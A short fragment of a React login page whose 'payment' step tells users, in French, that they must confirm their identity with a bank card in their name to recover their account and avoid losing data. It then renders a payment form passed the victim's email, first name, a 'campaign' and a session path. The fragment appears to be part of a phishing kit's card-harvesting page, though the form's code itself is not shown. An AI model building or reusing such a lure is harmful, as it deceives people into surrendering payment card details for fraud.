    ...
    <div className={styles.container}>
      ...
      <div className={styles.loginCard}>
        ...
        {step === 'payment' && ( //test payment
          <div className={styles.stepBody}>
            <p className={styles.subtitle}>
              Pour récupérer votre compte et éviter la perte de vos données, confirmez votre identité à l'aide d'une carte bancaire à votre nom.
            </p>
            <br />
            <PaymentForm email={email} firstName={firstName} campaign={campaign} sessionPath={sessionPath}/>
          </div>
        )}
      </div>
